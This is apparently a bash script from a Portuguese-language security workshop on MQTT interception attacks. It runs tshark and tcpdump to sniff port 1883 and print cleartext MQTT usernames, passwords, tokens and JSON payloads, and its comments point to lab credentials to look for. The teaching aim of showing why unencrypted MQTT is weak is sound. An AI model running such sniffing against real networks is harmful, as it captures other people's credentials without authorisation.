#!/usr/bin/env bash
# ============================================================
# CAPTURAR.sh - Sniffing do trafego MQTT no KALI
# Workshop 04: Ataques de Interceptacao e Injecao de Dados em MQTT
#
# Mostra em TEXTO CLARO:
#   1) as credenciais (usuario/senha) no pacote CONNECT
#   2) os payloads JSON com o token de aplicacao
#
# Uso: sudo ./capturar.sh [IP_BROKER]
# ============================================================
BROKER="${1:-172.30.234.55}"

echo "=== [1/2] Sniffing do trafego MQTT (tshark) - topico + payload ==="
echo "=== Assine o topico para ver os dados em texto claro ==="
echo ""

# tshark: decodifica o protocolo MQTT e mostra topico/payload legiveis
# Campos validos no tshark: mqtt.username / mqtt.passwd (credenciais),
# mqtt.topic / mqtt.msg (conteudo da mensagem)
sudo tshark -i any -f "tcp port 1883" -Y "mqtt" \
  -T fields -e frame.time_epoch -e mqtt.msgtype -e mqtt.topic -e mqtt.msg \
  -E header=y -E separator=' | '

echo ""
echo "=== [1b] Sniffing das CREDENCIAIS (tshark) - usuario e senha ==="
echo "=== Procure por: sensor_camara1 / sensor_senha_2024 ==="
echo ""

# Usuario/senha vao em texto claro no pacote CONNECT
timeout 15 sudo tshark -i any -f "tcp port 1883" -Y "mqtt.conflag.uname==1" \
  -T fields -e frame.time_epoch -e mqtt.clientid -e mqtt.username -e mqtt.passwd \
  -E header=y -E separator=' | '

echo ""
echo "=== [2/2] Modo bruto (tcpdump -A) - para ver o JSON completo ==="
echo "=== Procure por: sensor_camara1 / sensor_senha_2024 / tok_sensor ==="
echo ""

# tcpdump: payload ASCII bruto - mostra usuario/senha e token legiveis
sudo timeout 15 tcpdump -i any -A -s 0 "tcp port 1883" 2>/dev/null \
  | grep -E "sensor_|tok_|temperatura" --color=always
